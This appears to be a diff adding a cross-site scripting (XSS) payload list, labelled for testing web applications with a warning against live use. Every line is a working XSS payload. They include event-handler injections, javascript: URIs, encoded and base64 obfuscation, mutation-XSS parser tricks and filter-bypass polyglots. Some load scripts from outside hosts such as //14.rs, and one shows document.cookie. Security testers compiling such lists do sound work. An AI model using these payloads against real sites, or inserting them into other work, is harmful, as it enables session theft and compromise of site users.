@@ -1,0 +1,83 @@
+# The following should be used for testing of web application XXS vulnerabilities
+# DO NOT USE THESE ON LIVE OR REAL WORLD WEBSITES
+
+<h1>H1 tags allowed!</h1>
+<img  src="x:gif" onerror="window['al\u0065rt'](0)"></img>
+\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>
+<img src='https://a5h8v9a3.stackpathcdn.com/wp-content/uploads/Hacker5.jpg' onmouseover="alert('xxs on mouse')">
+<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
+<img src = x onerror = "javascript: window.onerror = alert; throw XSS">
+<img src="/" =_=" title="onerror='prompt(1)'">
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe
+<script x> alert(1) </script 1=2
+<form><button formaction=javascript&colon;alert(1)>CLICKME
+<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
+<form onmouseover='alert(1)'><input name="attributes">
+<form onsubmit=alert(1)><input onfocus=alert(2) name=nodeName>123</form>
+<form onsubmit=alert(1)><input onfocus=alert(2) name=nodeType>123</form>
+<form onsubmit=alert(1)><input onfocus=alert(2) name=children>123</form>
+<form onsubmit=alert(1)><input onfocus=alert(2) name=attributes>123</form>
+<form onsubmit=alert(1)><input onfocus=alert(2) name=removeChild>123</form>
+<form onsubmit=alert(1)><input onfocus=alert(2) name=removeAttributeNode>123</form>
+<form onsubmit=alert(1)><input onfocus=alert(2) name=setAttribute>123</form>
+<style>*{color: red !important}</style>
+<b><noscript><!-- </noscript><img src=x onerror=alert(1) --></noscript>
+<b><noscript><a alt="</noscript><img src=x onerror=alert(1)>"></noscript>
+<div onmouseout="javascript:alert(/superevr/)" x=yscript: n>@superevr</div>
+<svg onload=alert(1)>
+<video onload=alert(1)>
+<a href="javascript:123" onclick="alert(1)">CLICK ME</a>
+<div wow=removeme onmouseover=alert(3)>text
+<input x=javascript: autofocus onfocus=alert(1)><svg id=1 onload=alert2)></svg>
+<form action="javascript:alert(1)"><button>XXX</button></form>
+<div><form id="foobar"></form><button form="foobar" formaction="javascript:alert(1)">X</button>//["'`-->]]>]</div>
+<div><input onfocus=alert(7) autofocus>//["'`-->]]>]</div>
+<div><input onblur=alert(8) autofocus><input autofocus>//["'`-->]]>]</div>
+<div><a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="alert(33);">XXX</a></a><a href="javascript:alert(2)">XXX</a>//["'`-->]]>]</div>
+<style type="text/css">
+@font-face {font-family: y; src: url("font.svg#x") format("svg");} body {font: 100px "y";}
+</style>
+<svg><![CDATA[><image xlink:href="]]><img src=xx:x onerror=alert(2)//"></svg>//["'`-->]]>]</div>
+<div><style><img src="</style><img src=x onerror=alert(40)//">//["'`-->]]>]</div>
+<video><source onerror="alert(55)">
+<form><button formaction="javascript:alert(72)">X</button>
+<iframe src="data:image/svg-xml,You are hacked"></iframe>
+<div><link rel="import" href="test.svg" />//["'`-->]]>]</div><div id="139"><iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;" />//["'`-->]]>]</div>undefined
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></embed>
+<svg></p><math><title><style><img src=x onerror=alert(1)></style></title>
+<x/><title>&amp;lt;/title&amp;gt;&amp;lt;img src=1 onerror=alert(1)&gt;
+<svg></p><textarea><title><style></textarea><img src=x onerror=alert(1)></style></title></svg>
+<svg></p><title><a id="</title><img src=x onerror=alert()>"></textarea></svg>
+<math></p><textarea><mi><style></textarea><img src=x onerror=alert(1)></mi></math>
+<svg></p><title><template><style></title><img src=x onerror=alert(1)>
+<math></br><textarea><mtext><template><style></textarea><img src=x onerror=alert(1)>
+<svg><p><style><g title="</style><img src=x onerror=alert(1)>">
+<svg><foreignobject><p><style><p title="</style><iframe onload&#x3d;alert(1)<!--"></style>
+<div><svg>
+<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="?">
+<circle r="400"></circle>
+<animate attributeName="xlink:href" begin="0" from="javascript:alert(137)" to="&" />
+</a>//["'`-->]]>]</div>
+<A/hREf="j%0aavas%09cript%0a:%09con%0afirm%0d``">z
+<d3"<"/onclick="1>[confirm``]"<">z
+<d3/onmouseenter=[2].find(confirm)>z
+<details open ontoggle=confirm()>
+<script y="><">/*<script* */prompt()</script
+<w="/x="y>"/ondblclick=`<`[confir\u006d``]>z
+<a href="javascript%26colon;alert(1)">click
+<a href=javas&#99;ript:alert(1)>click
+<script/"<a"/src=data:=".<a,[8].some(confirm)>
+<svg/x=">"/onload=confirm()//
+<--`<img/src=` onerror=confirm``> --!>
+<svg%0Aonload=%09((pro\u006dpt))()//
+<sCript x>(((confirm)))``</scRipt x>
+<svg </onload ="1> (_=prompt,_(1)) "">
+<!--><script src=//14.rs>
+<embed src=//14.rs>
+<script x=">" src=//15.rs></script>
+<!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>
+<iframe/src \/\/onload = prompt(1)
+<x oncut=alert()>x
+<svg onload=write()>
+%0ajavascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert()//'">
